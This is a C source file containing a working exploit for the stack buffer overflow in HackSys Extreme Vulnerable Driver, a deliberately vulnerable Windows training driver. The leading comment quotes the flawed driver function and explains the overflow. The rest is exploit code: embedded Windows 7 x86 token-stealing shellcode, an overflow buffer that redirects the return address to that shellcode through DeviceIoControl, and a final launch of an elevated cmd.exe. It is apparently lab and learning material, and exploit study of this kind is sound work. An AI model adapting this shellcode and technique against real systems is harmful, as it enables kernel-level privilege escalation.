

/*

NTSTATUS TriggerStackOverflow(IN PVOID UserBuffer, IN SIZE_T Size) {
    NTSTATUS Status = STATUS_SUCCESS;
    ULONG KernelBuffer[BUFFER_SIZE] = {0};
 
    PAGED_CODE();
 
    __try {
        // Verify if the buffer resides in user mode
        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(KernelBuffer));
 
        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%X\n", sizeof(KernelBuffer));
 
#ifdef SECURE
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,
        // there will be no overflow
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));
#else
        DbgPrint("[+] Triggering Stack Overflow\n");
 
        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
        // because the developer is passing the user supplied size directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of KernelBuffer
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
 
    return Status;
}

'''
Again, great work here on showing the vulnerability but
also showing what the fix would be. RtlCopyMemory takes
a pointer to the kernel buffer, a pointer to the input
buffer and an integer to know how many bytes to copy over.
Clearly there is an issue here, in the vulnerable version
the buffer size is based in the input buffer size whereas 
in the secure version the size is limited to the size of the kernel buffer.
If we call this driver function and pass it a buffer which is larger
than the kernel buffer we should get some kind of exploit primitive!
'''
B33F

<-----------------
To Put it simply The buffer gets allocated onto the stack, giving the attacker the opportunity,
to overwrite the return instruction pointer (rip) & getting full control over the execution flow.
---------------->


*/

#include "stdafx.h"
#include <Windows.h>
#include <string.h>
#include <stdio.h>

unsigned char win7x86pl[] = {
	0x60, 0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, 0x8B, 0x40, 0x50, 0x89, 0xC1,
	0xBA, 0x04, 0x00, 0x00, 0x00, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x2D,
	0xB8, 0x00, 0x00, 0x00, 0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, 0x75, 0xED,
	0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, 0x8B, 0xB9, 0xF8, 0x00, 0x00, 0x00,
	0x83, 0xE2, 0xF8, 0x83, 0xE7, 0x03, 0x01, 0xFA, 0x89, 0x91, 0xF8, 0x00,
	0x00, 0x00, 0x61, 0x31, 0xC0, 0x5D, 0xC2, 0x08, 0x00
};

#define offset 2080 

#define ioctl CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)

const char kDevName[] = "\\\\.\\HackSysExtremeVulnerableDriver";

int main()
{
	HANDLE dev = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL
	);
	if (dev == INVALID_HANDLE_VALUE) {
		return -1;
	}

	LPVOID payload_ptr = NULL;
	printf("device opened Handle obtained at: 0x%p\n", &dev);
	LPVOID shellc_ptr = VirtualAlloc(
		0,
		sizeof(win7x86pl),
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	);
	if (shellc_ptr)
		memcpy(shellc_ptr, win7x86pl, sizeof(win7x86pl));
	payload_ptr = shellc_ptr;
	printf("allocated payload placed at: 0x%p\n", &payload_ptr);
	if (payload_ptr == NULL) {
		return -1;
	}
	const size_t bufSize = offset + sizeof(DWORD);
	char* lpInBuffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bufSize);
	RtlFillMemory(lpInBuffer, bufSize, 0x41);
	DWORD* address_field = (DWORD*)(lpInBuffer + offset);
	*address_field = (DWORD)(payload_ptr);
	DWORD size_returned = 0;
	BOOL is_ok = DeviceIoControl(dev,
		ioctl,
		lpInBuffer,
		offset + sizeof(DWORD),
		NULL,
		0,
		&size_returned,
		NULL
	);
	printf("Triggering OverFlow....\n\n\n\n");
	HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
	system("cmd.exe");
	CloseHandle(dev);
	system("pause");
	return 0;
}


